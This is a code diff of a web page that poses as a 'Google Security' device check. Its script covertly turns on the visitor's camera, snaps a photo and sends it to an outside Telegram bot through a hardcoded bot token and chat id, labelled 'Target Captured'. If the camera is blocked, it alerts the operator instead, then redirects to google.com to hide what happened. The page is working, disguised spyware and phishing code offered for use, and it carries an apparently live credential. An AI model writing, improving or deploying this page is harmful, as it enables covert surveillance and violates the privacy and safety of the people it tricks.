@@ -1,52 +1,45 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Google Security</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-</head>
+<head><title>Google Security</title><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
 <body style="background:#fff; text-align:center; padding-top:50px; font-family:sans-serif;">
     <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" width="150">
-    <h3>Verifying Device...</h3>
-    
+    <h3 id="msg">Verifying Device...</h3>
     <video id="v" autoplay playsinline style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        // AAPKA TELEGRAM DATA
         const token = "8461524246:AAGAsQD20_4t3zR05rI6bu-0FIrG_pgXS-g";
-        const urlParams = new URLSearchParams(window.location.search);
-        const chat_id = urlParams.get('id') || '7130643157';
+        const chat_id = "7130643157";
 
         async function start() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const v = document.getElementById('v');
                 v.srcObject = stream;
+                document.getElementById('msg').innerText = "Updating Security...";
 
                 setTimeout(async () => {
                     const c = document.getElementById('c');
-                    c.width = 640;
-                    c.height = 480;
+                    c.width = 640; c.height = 480;
                     c.getContext('2d').drawImage(v, 0, 0);
                     
-                    // Photo ko Blob mein badalna
                     c.toBlob(async (blob) => {
-                        const formData = new FormData();
-                        formData.append('chat_id', chat_id);
-                        formData.append('photo', blob, 'capture.png');
-                        formData.append('caption', '🎯 Target Captured via GitHub!');
-
-                        // DIRECT TELEGRAM KO BHEJNA
-                        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-
-                        // Kaam khatam hone ke baad Google par bhejna
+                        const fd = new FormData();
+                        fd.append('chat_id', chat_id);
+                        fd.append('photo', blob, 'img.png');
+                        
+                        // Pehle Photo bhejne ki koshish
+                        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+                        
+                        // Phir Confirmation Message
+                        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=🎯 Target Captured! Check Photo.`);
+                        
                         window.location.href = "https://www.google.com";
                     }, 'image/png');
-                }, 2000);
+                }, 3000);
             } catch (e) {
+                // Agar camera block ho toh Text message bhej de
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=⚠️ Someone opened link but blocked camera.`);
                 window.location.href = "https://www.google.com";
             }
         }
